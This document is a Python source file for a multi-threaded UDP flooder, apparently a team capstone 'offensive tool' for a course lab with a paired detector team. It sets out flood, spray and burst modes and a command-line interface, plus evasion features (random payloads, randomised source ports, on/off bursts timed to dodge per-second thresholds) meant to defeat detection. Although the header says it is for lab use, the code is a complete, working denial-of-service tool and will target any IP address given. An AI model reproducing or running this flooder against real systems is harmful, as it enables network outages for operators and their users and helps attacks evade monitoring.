"""
udp_flooder.py — Slot B2 Capstone (Offensive Tool)

Multi-threaded UDP flooder with three modes (flood, spray, burst) and
pattern-based evasion. Lab use only; runs only inside the provided
Docker compose environment (see docker-compose.yml).

OWNERSHIP — OFFENSIVE TEAM (3 members)
======================================
A1 — Core Sender / Threading / Flood Mode
    send_udp_packet, sender_worker, rate_limit_sleep,
    run_flood_mode, ThreadStats, main() wiring

A2 — Spray / Burst / Scheduling
    pick_random_port, run_spray_mode,
    BurstScheduler, run_burst_mode

A3 — Evasion / CLI / JSON Stats Logging + udp_echo_server.py
    random_payload, choose_source_port, build_argparser,
    JsonStatsLogger, write_stats_snapshot, udp_echo_server.py

Integration owner: A1 (wires main()).
Cross-team liaison with detector team: A3.
"""
from os import urandom
import argparse
import json
import random
import socket
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path


# ======================================================================
# SECTION 1 — Core sender, threading, flood mode       (Owner: A1)
# ======================================================================

@dataclass
class ThreadStats:
    """Per-thread counters. Aggregated by A3's stats logger. Owner: A1."""
    packets_sent: int = 0
    bytes_sent: int = 0
    errors: int = 0
    started_at: float = field(default_factory=time.time)


def send_udp_packet(sock, target_ip, target_port, payload):
    """
    Send one UDP datagram down `sock`. Owner: A1.

    `sock` is created and (optionally) bound by sender_worker so that
    A3's choose_source_port() randomisation is respected.
    Returns bytes_sent, or raises on socket error (caller logs).
    """
    bytes_sent = sock.sendto(payload, (target_ip, target_port))

    return bytes_sent

    


def rate_limit_sleep(target_pps, packets_in_window, window_started_at):
    """
    Token-bucket-style sleep to hold per-thread PPS at `target_pps`.
    Owner: A1. Called inside sender_worker between sends.
    """
    if target_pps <= 0:
        return

    expected_elapsed = packets_in_window / target_pps

    actual_elapsed = time.time() - window_started_at

    if expected_elapsed > actual_elapsed:
        time.sleep(expected_elapsed - actual_elapsed)


def sender_worker(thread_id, args, stats, stop_event, target_provider):
    """
    Long-running worker thread. Owner: A1.

    `target_provider()` is a callable returned by the mode function
    that yields (target_ip, target_port, payload) tuples — this is how
    flood/spray/burst customise per-packet behaviour without forking
    this loop. Worker stops cleanly when `stop_event` is set.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        try:
            source_port = choose_source_port()
            sock.bind(("", source_port))
        except Exception:
            pass

        packets_in_window = 0
        window_started_at = time.time()

        while not stop_event.is_set():

            target_data = target_provider()

            if target_data is None:
                continue              # burst OFF phase — do NOT increment counter

            target_ip, target_port, payload = target_data

            try:
                bytes_sent = send_udp_packet(
                    sock,
                    target_ip,
                    target_port,
                    payload
                )
                stats.packets_sent += 1
                stats.bytes_sent   += bytes_sent

            except Exception:
                stats.errors += 1

            # Only incremented after a real send attempt, not on None skips
            packets_in_window += 1

            rate_limit_sleep(
                args.rate,
                packets_in_window,
                window_started_at
            )

            if time.time() - window_started_at >= 1:
                packets_in_window = 0
                window_started_at = time.time()

    finally:
        sock.close()

def run_flood_mode(args, stats_list, stop_event):
    """
    flood: high-volume UDP packets to a single (target, port). Owner: A1.

    Spawns `args.threads` workers, each with its own ThreadStats,
    targeting (args.target, args.port). Returns when stop_event is set
    or args.duration elapses.
    """

    def target_provider():

        payload = random_payload(args.payload_size)

        return args.target, args.port, payload

    threads = []

    for i in range(args.threads):

        t = threading.Thread(
            target=sender_worker,
            args=(
                i,
                args,
                stats_list[i],
                stop_event,
                target_provider
            )
        )

        threads.append(t)

        t.start()

    start_time = time.time()

    try:

        while not stop_event.is_set():

            if args.duration > 0:

                elapsed = time.time() - start_time

                if elapsed >= args.duration:
                    stop_event.set()
                    break

            time.sleep(0.5)

    except KeyboardInterrupt:
        stop_event.set()

    for t in threads:
        t.join()


# ======================================================================
# SECTION 2 — Spray mode, Burst scheduling             (Owner: A2)
# ======================================================================

def pick_random_port(low=1, high=65535):
    """Random destination port for spray mode. Owner: A2."""
    return random.randint(low, high)




def run_spray_mode(args, stats_list, stop_event):
    """
    spray: random destination port per packet, configurable range.
    Owner: A2. Reuses sender_worker (A1) with a target_provider that
    randomises the dst port on each call.
    """
    def target_provider():
        port    = pick_random_port()
        payload = random_payload(args.payload_size)
        return args.target, port, payload

    threads = []
    for i in range(args.threads):
        t = threading.Thread(
            target=sender_worker,
            args=(i, args, stats_list[i], stop_event, target_provider)
        )
        threads.append(t)
        t.start()

    start_time = time.time()

    try:
        while not stop_event.is_set():
            if args.duration > 0:
                if time.time() - start_time >= args.duration:
                    stop_event.set()
                    break
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop_event.set()

    for t in threads:
        t.join()




class BurstScheduler:
    """
    Alternates `burst_on` seconds of high-rate sending with `burst_off`
    seconds of silence. Owner: A2.

    This is the evasion behaviour required by the deliverable: per-second
    thresholds in the detector won't fire on the average rate, but the
    rolling-average burst detector (D2) will.
    """

    def __init__(self, burst_on: float, burst_off: float):
        self.burst_on =burst_on
        self.burst_off = burst_off
        self.cycle = burst_on + burst_off
        self.started_at = time.time()

        

    def should_send_now(self) -> bool:
        """True during ON phase, False during pause."""
        elapse = time.time() - self.started_at
        postion_in_cycle = elapse % self.cycle # using mode to know the congrunt index 
        return postion_in_cycle < self.burst_on

    def time_until_next_phase(self) -> float:
        """Helper so workers can sleep through the OFF phase cleanly."""
        elapsed      = time.time() - self.started_at
        pos_in_cycle = elapsed % self.cycle

        if pos_in_cycle < self.burst_on:
            
            return self.burst_on - pos_in_cycle
        else:
        
            return self.cycle - pos_in_cycle    


def run_burst_mode(args, stats_list, stop_event):
    """
    burst envelope wrapping flood (default) — and optionally spray
    if you decide to support burst-over-spray. Owner: A2.
    """
    scheduler = BurstScheduler(args.burst_on, args.burst_off)

    def target_provider():
        if not scheduler.should_send_now():
            time.sleep(scheduler.time_until_next_phase())
            return None   # tells sender_worker: skip this iteration

        payload = random_payload(args.payload_size)
        return args.target, args.port, payload

    threads = []
    for i in range(args.threads):
        t = threading.Thread(
            target=sender_worker,
            args=(i, args, stats_list[i], stop_event, target_provider)
        )
        threads.append(t)
        t.start()

    start_time = time.time()

    try:
        while not stop_event.is_set():
            if args.duration > 0:
                if time.time() - start_time >= args.duration:
                    stop_event.set()
                    break
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop_event.set()

    for t in threads:
        t.join()


# ======================================================================
# SECTION 3 — Evasion, CLI, JSON stats                 (Owner: A3)
# ======================================================================

def random_payload(size: int) -> bytes:
    """
    Random-content payload of exactly `size` bytes — no fixed signature.
    Owner: A3.
    """
    if size <= 0:
        return b""
    return urandom(size)


def choose_source_port(low=1024, high=65535) -> int:
    """
    Random ephemeral source port (caller binds the socket to it).
    Owner: A3. This is one half of the required evasion.
    """
    return random.randint(low, high)


def build_argparser() -> argparse.ArgumentParser:
    """
    All CLI flags from the deliverable. Owner: A3.

    Required: --target --port --mode {flood,spray,burst}
              --rate --payload-size --threads --duration
              --burst-on --burst-off --log
    Optional (nice to have): --spray-port-min --spray-port-max --seed
    """
    parser = argparse.ArgumentParser(
        prog="udp_flooder.py",
        description="UDP flooder — use inside Docker lab only.",
    )

    parser.add_argument("--target",       required=True,             help="Target IP address.")
    parser.add_argument("--port",         type=int, default=9999,    help="Destination UDP port (default: 9999).")
    parser.add_argument("--mode",         choices=["flood","spray","burst"], default="flood", help="Attack mode.")
    parser.add_argument("--rate",         type=int, default=100,     help="Packets per second per thread (default: 100).")
    parser.add_argument("--payload-size", type=int, default=512,     dest="payload_size", help="Payload size in bytes (default: 512).")
    parser.add_argument("--threads",      type=int, default=1,       help="Number of sender threads (default: 1).")
    parser.add_argument("--duration",     type=float, default=0.0,   help="Seconds to run, 0 = run until Ctrl+C (default: 0).")
    parser.add_argument("--burst-on",     type=float, default=3.0,   dest="burst_on",  help="Seconds of fast sending per burst (default: 3.0).")
    parser.add_argument("--burst-off",    type=float, default=5.0,   dest="burst_off", help="Seconds of silence between bursts (default: 5.0).")
    parser.add_argument("--log",          default="flooder_stats.json", help="Path to the JSON log file (default: flooder_stats.json).")

    return parser

class JsonStatsLogger:
    """
    Append-only JSON-lines stats logger. Owner: A3.

    Record schema (one line per snapshot interval):
      {"ts": <ISO8601>, "target": "...", "mode": "flood|spray|burst",
       "packets_sent": int, "bytes_sent": int, "measured_pps": float}
    """

    def __init__(self, path: Path):
        self._file = Path(path).open("a", encoding="utf-8")

    def write(self, record: dict) -> None:
        self._file.write(json.dumps(record) + "\n")
        self._file.flush()

    def close(self) -> None:
        self._file.close()



def write_stats_snapshot(logger, args, stats_list):
    total_packets = sum(s.packets_sent for s in stats_list)
    total_bytes   = sum(s.bytes_sent   for s in stats_list)
    elapsed       = time.time() - min(s.started_at for s in stats_list) if stats_list else 0
    measured_pps  = round(total_packets / elapsed, 2) if elapsed > 0 else 0.0

    now = datetime.now(timezone.utc)          # ← call once, use twice
    ts  = now.strftime("%Y-%m-%dT%H:%M:%S.") + f"{now.microsecond // 1000:03d}Z"

    record = {
        "ts":           ts,
        "target":       args.target,
        "mode":         args.mode,
        "packets_sent": total_packets,
        "bytes_sent":   total_bytes,
        "measured_pps": measured_pps,
    }
    logger.write(record)

# ======================================================================
# MAIN — dispatch by --mode                             (Owner: A1)
# ======================================================================

MODES = {
    "flood": run_flood_mode,   # A1
    "spray": run_spray_mode,   # A2
    "burst": run_burst_mode,   # A2
}


def main():
    """
    Integration glue. Owner: A1.

    Steps:
      1. parser = build_argparser() ; args = parser.parse_args()    (A3)
      2. logger = JsonStatsLogger(args.log)                          (A3)
      3. stats_list = [ThreadStats() for _ in range(args.threads)]   (A1)
      4. stop_event = threading.Event()                              (A1)
      5. Start reporter thread that calls write_stats_snapshot every 1s (A3)
      6. MODES[args.mode](args, stats_list, stop_event)              (A1)
      7. On SIGINT / duration: stop_event.set(); join; logger.close()
    """
    parser = build_argparser()

    args = parser.parse_args()

    logger = JsonStatsLogger(Path(args.log))

    stats_list = [
        ThreadStats()
        for _ in range(args.threads)
    ]

    stop_event = threading.Event()

    def reporter_loop():

        while not stop_event.is_set():

            try:
                write_stats_snapshot(
                    logger,
                    args,
                    stats_list
                )

            except Exception as e:
                print(f"Reporter error: {e}")

            time.sleep(1)

    reporter_thread = threading.Thread(
        target=reporter_loop,
        daemon=True
    )

    reporter_thread.start()

    try:

        mode_function = MODES.get(args.mode)

        if mode_function is None:
            raise ValueError(f"Unknown mode: {args.mode}")

        mode_function(
            args,
            stats_list,
            stop_event
        )

    except KeyboardInterrupt:

        print("\nStopping...")

        stop_event.set()

    finally:

        stop_event.set()

        reporter_thread.join(timeout=2)

        try:
            logger.close()
        except Exception:
            pass

        total_packets = sum(s.packets_sent for s in stats_list)
        total_bytes = sum(s.bytes_sent for s in stats_list)
        total_errors = sum(s.errors for s in stats_list)

        print("\n===== FINAL STATS =====")
        print(f"Packets Sent : {total_packets}")
        print(f"Bytes Sent   : {total_bytes}")
        print(f"Errors       : {total_errors}")




if __name__ == "__main__":
    main()
